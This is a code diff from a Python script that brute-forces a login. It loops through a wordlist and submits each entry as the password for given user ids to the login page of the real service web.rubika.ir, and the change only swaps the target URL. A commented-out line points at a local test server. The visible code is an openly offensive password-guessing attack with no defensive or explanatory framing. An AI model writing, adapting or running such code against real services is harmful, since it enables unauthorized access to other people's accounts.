@@ -109,7 +109,7 @@ try:
 
                 while shekan:
                     for word in wordlist:
-                        Target = requests.post("https://web.rubika.ir/desktop/login.aspx",data=f"_tt=187902&usrid={users}&ups={word}&btnSubmit=%D9%88%D8%B1%D9%88%D8%AF+%D8%A8%D9%87+%D8%A8%D8%AE%D8%B4+%D9%85%D8%AF%DB%8C%D8%B1%DB%8C%D8%AA+%D9%88%D8%A8%D9%84%D8%A7%DA%AF")
+                        Target = requests.post("https://web.rubika.ir/",data=f"_tt=187902&usrid={users}&ups={word}&btnSubmit=%D9%88%D8%B1%D9%88%D8%AF+%D8%A8%D9%87+%D8%A8%D8%AE%D8%B4+%D9%85%D8%AF%DB%8C%D8%B1%DB%8C%D8%AA+%D9%88%D8%A8%D9%84%D8%A7%DA%AF")
                         # Target = requests.post("http://127.0.0.1:8090/Login.php",data={"usrid":{users},"ups":word,"sub":"submit"}).text
 
                         try:
